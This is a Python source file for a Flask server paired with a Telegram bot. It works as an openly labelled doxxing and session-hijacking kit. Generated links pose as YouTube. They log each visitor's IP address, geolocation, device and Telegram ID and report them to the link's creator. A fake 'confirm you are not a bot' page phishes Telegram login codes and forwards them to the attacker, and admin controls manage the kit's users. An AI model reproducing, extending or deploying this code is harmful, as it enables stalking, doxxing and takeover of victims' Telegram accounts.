import os
import json
import sqlite3
import random
import string
import time
import threading
import requests
from datetime import datetime
from flask import Flask, request, redirect, render_template_string
import telebot

# ======================== КОНФИГ ============================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
PORT = int(os.environ.get("PORT", 5000))

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ======================== БАЗА ДАННЫХ ============================
conn = sqlite3.connect('sessions.db', check_same_thread=False)
cursor = conn.cursor()

# Таблица пользователей
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    status TEXT DEFAULT 'active',
    registered_at TEXT
)''')

# Таблица логов
cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    link_id TEXT,
    ip TEXT,
    country TEXT,
    city TEXT,
    device TEXT,
    os TEXT,
    browser TEXT,
    battery TEXT,
    cpu TEXT,
    ram TEXT,
    tg_id TEXT,
    timestamp TEXT
)''')

# Таблица ссылок
cursor.execute('''CREATE TABLE IF NOT EXISTS links (
    link_id TEXT PRIMARY KEY,
    user_id INTEGER,
    mode INTEGER,
    created_at TEXT,
    active INTEGER DEFAULT 1
)''')
conn.commit()

# ======================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ============================
def is_admin(user_id):
    return user_id == ADMIN_ID

def get_user_status(user_id):
    cursor.execute('SELECT status FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    return row[0] if row else None

def register_user(user_id, username, first_name):
    cursor.execute('''INSERT OR IGNORE INTO users (user_id, username, first_name, registered_at)
                      VALUES (?, ?, ?, ?)''',
                   (user_id, username, first_name, datetime.now().isoformat()))
    conn.commit()

@app.route('/health')
def health():
    return "OK", 200

def generate_link(user_id, mode):
    link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    cursor.execute('INSERT INTO links (link_id, user_id, mode, created_at) VALUES (?, ?, ?, ?)',
                   (link_id, user_id, mode, datetime.now().isoformat()))
    conn.commit()
    base_url = request.host_url if 'request' in dir() else 'https://butno-1.onrender.com/'
    if mode == 1:
        return link_id, f"{base_url}collect/{link_id}"
    elif mode == 2:
        return link_id, f"{base_url}verify/{link_id}"
    elif mode == 3:
        return link_id, f"{base_url}custom/{link_id}"
    return None, None

# ======================== FLASK РОУТЫ ============================
@app.route('/collect/<link_id>')
def collect_data(link_id):
    cursor.execute('SELECT user_id FROM links WHERE link_id = ? AND active = 1', (link_id,))
    row = cursor.fetchone()
    if not row:
        return "Ссылка недействительна", 404
    user_id = row[0]

    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]

    try:
        import user_agents
        ua = user_agents.parse(user_agent)
        device = ua.device.family
        os_name = ua.os.family
        browser = ua.browser.family
    except:
        device = os_name = browser = 'N/A'

    geo = requests.get(f'http://ip-api.com/json/{ip}').json()
    battery = request.args.get('battery', 'N/A')
    cpu = request.args.get('cpu', 'N/A')
    ram = request.args.get('ram', 'N/A')
    tg_id = request.args.get('tg_id', 'N/A')

    cursor.execute('''INSERT INTO logs (user_id, link_id, ip, country, city, device, os, browser, battery, cpu, ram, tg_id, timestamp)
                      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                   (user_id, link_id, ip, geo.get('country'), geo.get('city'),
                    device, os_name, browser, battery, cpu, ram, tg_id, datetime.now().isoformat()))
    conn.commit()

    report = (f"📡 **ДОКС-ОТЧЁТ**\n"
              f"🔗 ID: {link_id}\n"
              f"🌍 IP: {ip}\n"
              f"📍 Страна: {geo.get('country')}, {geo.get('city')}\n"
              f"📱 Устройство: {device}\n"
              f"💻 ОС: {os_name}\n"
              f"🌐 Браузер: {browser}\n"
              f"🔋 Заряд: {battery}%\n"
              f"🧠 CPU ядер: {cpu}\n"
              f"🧮 RAM: {ram} ГБ\n"
              f"🆔 Telegram ID: {tg_id}")
    bot.send_message(user_id, report)
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

@app.route('/verify/<link_id>')
def verify_page(link_id):
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head><title>Подтверждение</title></head>
    <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
        <h2>⚠️ Подтвердите, что вы не бот</h2>
        <p>На ваш Telegram отправлен код подтверждения.</p>
        <form action="/session/{{link_id}}" method="POST">
            <input type="text" name="code" placeholder="Введите код" required>
            <button type="submit">Подтвердить</button>
        </form>
    </body>
    </html>
    """, link_id=link_id)

@app.route('/session/<link_id>', methods=['POST'])
def session_steal(link_id):
    code = request.form.get('code')
    cursor.execute('SELECT user_id FROM links WHERE link_id = ?', (link_id,))
    row = cursor.fetchone()
    if row:
        bot.send_message(row[0], f"🔑 Код введён: {code}\nСессия: {link_id}")
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

@app.route('/custom/<link_id>')
def custom_page(link_id):
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head><title>Видео</title></head>
    <body>
        <h1>Проверка</h1>
        <p>Введите код для продолжения</p>
        <form action="/custom_redirect/{{link_id}}" method="POST">
            <input type="text" name="code">
            <input type="submit">
        </form>
    </body>
    </html>
    """, link_id=link_id)

@app.route('/custom_redirect/<link_id>', methods=['POST'])
def custom_redirect(link_id):
    code = request.form.get('code')
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

# ======================== TELEGRAM БОТ ============================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or 'N/A'
    first_name = message.from_user.first_name or 'N/A'
    register_user(user_id, username, first_name)
    
    if user_id == ADMIN_ID:
        markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.KeyboardButton("Режим 1 – Докс"),
            telebot.types.KeyboardButton("Режим 2 – Угон сессии"),
            telebot.types.KeyboardButton("Режим 3 – Продвинутый угон"),
            telebot.types.KeyboardButton("👥 Пользователи"),
            telebot.types.KeyboardButton("📊 Статистика")
        )
        bot.send_message(user_id, "👑 Админ-панель", reply_markup=markup)
    else:
        markup = telebot.types.ReplyKeyboardMarkup(row_width=1)
        markup.add(
            telebot.types.KeyboardButton("Режим 1 – Докс"),
            telebot.types.KeyboardButton("Режим 2 – Угон сессии"),
            telebot.types.KeyboardButton("Режим 3 – Продвинутый угон")
        )
        bot.send_message(user_id, "Выбери режим:", reply_markup=markup)

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE users SET status = "banned" WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"🚫 Пользователь {user_id} забанен")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /ban ID")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE users SET status = "active" WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"✅ Пользователь {user_id} разбанен")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /unban ID")

@bot.message_handler(commands=['revoke'])
def revoke_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE links SET active = 0 WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"🔒 Все ссылки пользователя {user_id} деактивированы")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /revoke ID")

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    user_id = message.from_user.id
    if get_user_status(user_id) == 'banned':
        bot.send_message(user_id, "🚫 Ты забанен. Обратись к админу.")
        return

    if message.text == "Режим 1 – Докс":
        link_id, link = generate_link(user_id, 1)
        bot.send_message(user_id, f"📎 Ссылка: {link}\nМаскируется под YouTube")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 1\nСсылка: {link}")
    elif message.text == "Режим 2 – Угон сессии":
        link_id, link = generate_link(user_id, 2)
        bot.send_message(user_id, f"📎 Ссылка: {link}\nЖертва получит запрос кода")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 2\nСсылка: {link}")
    elif message.text == "Режим 3 – Продвинутый угон":
        link_id, link = generate_link(user_id, 3)
        bot.send_message(user_id, f"📎 Ссылка: {link}\nМеняй код страницы динамически")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 3\nСсылка: {link}")
    elif message.text == "👥 Пользователи" and is_admin(user_id):
        cursor.execute('SELECT user_id, username, first_name, status FROM users')
        rows = cursor.fetchall()
        text = "📋 **Пользователи:**\n\n"
        for row in rows:
            text += f"🆔 {row[0]} | @{row[1]} | {row[2]} | {row[3]}\n"
        bot.send_message(user_id, text)
    elif message.text == "📊 Статистика" and is_admin(user_id):
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM logs')
        total_logs = cursor.fetchone()[0]
        bot.send_message(user_id, f"📊 **Статистика:**\n👥 Всего пользователей: {total_users}\n📡 Всего докс-отчётов: {total_logs}")

# ======================== ЗАПУСК ============================
if __name__ == '__main__':
    threading.Thread(target=bot.polling, kwargs={'none_stop': True}).start()
    app.run(host='0.0.0.0', port=PORT)
